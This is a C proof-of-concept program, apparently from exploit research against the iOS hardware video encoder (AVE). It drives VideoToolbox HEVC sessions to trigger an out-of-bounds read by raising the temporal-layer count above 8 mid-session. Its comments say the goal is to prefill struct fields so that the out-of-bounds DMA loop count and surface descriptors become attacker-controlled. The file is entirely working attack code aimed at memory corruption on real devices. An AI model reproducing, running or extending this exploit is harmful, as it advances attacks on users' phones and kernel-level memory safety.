/*
 * ave_session_reuse.c — AVE DMA OOB via Session Reuse
 *
 * Target: iPhone Duo (A20 Pro), iOS 27.1
 * Purpose: Explore whether encoding with normal NTL first, then increasing
 *          NTL mid-session, leaves controlled values in the OOB region.
 *
 * Theory: The per-layer array at struct+0x514 has 8 entries, but the
 * struct fields at +0x534 onwards (the OOB region) may retain values
 * from a previous encode operation. If we first encode with settings
 * that write known values to these offsets, then re-encode with NTL>8,
 * the DMA config function at AVE2+0x13d308 will use our controlled
 * values as the loop count (+0x534) and surface descriptors (+0x538+).
 *
 * Key insight from RE: struct+0x534 is used as a LOOP COUNT for DMA
 * register writes. We want it to be 1 (single DMA) not 89 (crash).
 *
 * Approach:
 * 1. Create HEVC encode session with normal NTL (2-4)
 * 2. Encode several frames to populate struct fields
 * 3. Without destroying the session, change NTL to >8
 * 4. Encode another frame — NTL>8 reads from +0x534+ (previous values)
 *
 * Modes:
 *   info     — show test modes
 *   safe     — normal encode with NTL=4 (baseline, no OOB)
 *   reuse_N  — encode 3 frames NTL=4, then 1 frame NTL=N (N>8)
 *   multi_M_N — encode M frames NTL=4, then trigger NTL=N
 *   prefill  — encode with specific properties to fill +0x534 area
 *
 * Build: see build_and_deploy.sh
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/sysctl.h>
#include <mach/mach.h>
#include <VideoToolbox/VideoToolbox.h>
#include <CoreVideo/CoreVideo.h>
#include <CoreMedia/CoreMedia.h>

static FILE *out;

static void p(const char *fmt, ...) {
    va_list ap;
    va_start(ap, fmt);
    vfprintf(out, fmt, ap);
    va_end(ap);
    fflush(out);
}

static void set_int_prop(VTCompressionSessionRef s, CFStringRef key, int val) {
    CFNumberRef n = CFNumberCreate(NULL, kCFNumberIntType, &val);
    OSStatus st = VTSessionSetProperty(s, key, n);
    CFRelease(n);
    p("  Set %s = %d → %d\n",
      CFStringGetCStringPtr(key, kCFStringEncodingUTF8) ?: "?", val, (int)st);
}

static CVPixelBufferRef make_frame(int width, int height, uint8_t fill) {
    CVPixelBufferRef pb = NULL;
    CVPixelBufferCreate(NULL, width, height, kCVPixelFormatType_32BGRA, NULL, &pb);
    if (!pb) return NULL;
    CVPixelBufferLockBaseAddress(pb, 0);
    void *base = CVPixelBufferGetBaseAddress(pb);
    if (base) memset(base, fill, CVPixelBufferGetDataSize(pb));
    CVPixelBufferUnlockBaseAddress(pb, 0);
    return pb;
}

static void encode_callback(void *ref, void *src, OSStatus st,
                             VTEncodeInfoFlags flags, CMSampleBufferRef buf) {
    int *count = (int *)ref;
    if (count) (*count)++;
    if (buf) {
        CMBlockBufferRef bb = CMSampleBufferGetDataBuffer(buf);
        size_t len = bb ? CMBlockBufferGetDataLength(bb) : 0;
        /* Can't call p() safely from callback in all cases */
        (void)len;
    }
}

static int session_reuse_test(int width, int height, int prefill_ntl,
                               int prefill_frames, int trigger_ntl) {
    p("\n[*] Session reuse test: %dx%d\n", width, height);
    p("    Prefill: NTL=%d, %d frames\n", prefill_ntl, prefill_frames);
    p("    Trigger: NTL=%d\n\n", trigger_ntl);

    int encoded_count = 0;
    VTCompressionSessionRef session = NULL;
    OSStatus st = VTCompressionSessionCreate(
        kCFAllocatorDefault, width, height, kCMVideoCodecType_HEVC,
        NULL, NULL, NULL, encode_callback, &encoded_count, &session);
    if (st != noErr || !session) {
        p("[-] Session create failed: %d\n", (int)st);
        return -1;
    }

    /* Base properties for HW encode path */
    set_int_prop(session, CFSTR("EncoderUsage"), 1);
    set_int_prop(session, CFSTR("RCMode"), 20);
    VTSessionSetProperty(session, kVTCompressionPropertyKey_RealTime, kCFBooleanFalse);
    p("  RealTime = false\n");

    /* Phase 1: prefill with normal NTL */
    set_int_prop(session, CFSTR("NumberOfTemporalLayers"), prefill_ntl);

    st = VTCompressionSessionPrepareToEncodeFrames(session);
    if (st != noErr) {
        p("[-] Prepare failed: %d\n", (int)st);
        VTCompressionSessionInvalidate(session);
        CFRelease(session);
        return -2;
    }

    p("\n[*] Phase 1: encoding %d frames with NTL=%d\n", prefill_frames, prefill_ntl);
    for (int i = 0; i < prefill_frames; i++) {
        CVPixelBufferRef pb = make_frame(width, height, 0x41 + i);
        if (!pb) { p("[-] Frame %d: pixelbuf failed\n", i); continue; }

        VTEncodeInfoFlags flags = 0;
        st = VTCompressionSessionEncodeFrame(session, pb,
            CMTimeMake(i, 30), CMTimeMake(1, 30), NULL, NULL, &flags);
        p("  Frame %d: status=%d flags=0x%x\n", i, (int)st, (unsigned)flags);
        CVPixelBufferRelease(pb);

        if (st != noErr) break;
    }

    /* Flush to ensure all frames are processed */
    VTCompressionSessionCompleteFrames(session, kCMTimeInvalid);
    p("[+] Phase 1 complete: %d frames encoded\n", encoded_count);

    /* Phase 2: change NTL mid-session and trigger OOB */
    p("\n[*] Phase 2: changing NTL to %d mid-session\n", trigger_ntl);
    set_int_prop(session, CFSTR("NumberOfTemporalLayers"), trigger_ntl);

    /* Note: some properties may not be changeable mid-session.
     * If NTL change is rejected, we try PrepareToEncodeFrames again.
     * If that also fails, we know mid-session NTL change isn't supported. */

    p("[!] Submitting trigger frame — NTL=%d will read OOB from struct+0x534+\n",
        trigger_ntl);
    p("[!] If prefill values survive at +0x534, FAR should differ from 0x59\n");

    CVPixelBufferRef trigger_pb = make_frame(width, height, 0xCC);
    if (!trigger_pb) {
        p("[-] Trigger frame pixelbuf failed\n");
        VTCompressionSessionInvalidate(session);
        CFRelease(session);
        return -4;
    }

    VTEncodeInfoFlags tflags = 0;
    st = VTCompressionSessionEncodeFrame(session, trigger_pb,
        CMTimeMake(prefill_frames, 30), CMTimeMake(1, 30), NULL, NULL, &tflags);
    p("[+] Trigger frame: status=%d flags=0x%x\n", (int)st, (unsigned)tflags);

    if (st == noErr) {
        VTCompressionSessionCompleteFrames(session, kCMTimeInvalid);
        p("[*] Trigger completed without crash — struct+0x534 may be 0 (safe)\n");
        p("[*] Or DMA landed in valid memory (silent corruption)\n");
    }

    VTCompressionSessionInvalidate(session);
    CFRelease(session);
    CVPixelBufferRelease(trigger_pb);
    return (int)st;
}

int main(int argc, char *argv[]) {
    char path[1024];
    const char *home = getenv("HOME");
    if (!home) home = "/tmp";
    const char *mode = (argc >= 2) ? argv[1] : "info";
    snprintf(path, sizeof(path), "%s/Documents/ave_reuse_%s.txt", home, mode);
    out = fopen(path, "w");
    if (!out) { out = fopen("/tmp/ave_reuse.txt", "w"); }
    if (!out) return 1;

    p("=== AVE Session Reuse OOB Test ===\n");
    p("Mode: %s\nPID: %d\n\n", mode, getpid());

    char buf[256]; size_t len;
    len = sizeof(buf); sysctlbyname("kern.osversion", buf, &len, NULL, 0);
    p("Build: %s\n", buf);
    len = sizeof(buf); sysctlbyname("hw.machine", buf, &len, NULL, 0);
    p("Machine: %s\n\n", buf);

    if (strcmp(mode, "info") == 0) {
        p("Session Reuse OOB — encode normally then change NTL mid-session\n\n");
        p("Theory: Prefill struct+0x534 area with known values via normal\n");
        p("encoding, then trigger OOB read with NTL>8. If +0x534 retains\n");
        p("a prefill value instead of 0x59, we control the DMA loop count.\n\n");
        p("Modes:\n");
        p("  safe            — NTL=4, 5 frames (no OOB, baseline)\n");
        p("  reuse_9         — 3 frames NTL=4, then 1 frame NTL=9\n");
        p("  reuse_10        — 3 frames NTL=4, then 1 frame NTL=10\n");
        p("  multi_M_N       — M prefill frames, then NTL=N trigger\n");
        p("  prefill         — encode with max properties to fill struct area\n");
        p("\nCompare panic FAR with original (0x59) and baseline.\n");
        p("If FAR changes, prefill values survived at +0x534.\n");
    }
    else if (strcmp(mode, "safe") == 0) {
        session_reuse_test(1280, 720, 4, 5, 4);
    }
    else if (strncmp(mode, "reuse_", 6) == 0) {
        int trigger_ntl = atoi(mode + 6);
        if (trigger_ntl < 9) trigger_ntl = 9;
        session_reuse_test(1280, 720, 4, 3, trigger_ntl);
    }
    else if (strncmp(mode, "multi_", 6) == 0) {
        int m = 3, n = 9;
        sscanf(mode + 6, "%d_%d", &m, &n);
        if (n < 9) n = 9;
        if (m < 1) m = 1;
        session_reuse_test(1280, 720, 4, m, n);
    }
    else if (strcmp(mode, "prefill") == 0) {
        /* Encode with many different property combinations to try to
         * write to as many struct fields as possible before triggering */
        p("[*] Prefill mode: trying to populate struct area\n\n");

        /* First: encode with NTL=8 (max normal) to fill entire per-layer array */
        session_reuse_test(1280, 720, 8, 5, 9);
    }
    else {
        p("Unknown mode: %s\n", mode);
    }

    p("\n=== Done ===\n");
    fclose(out);
    return 0;
}
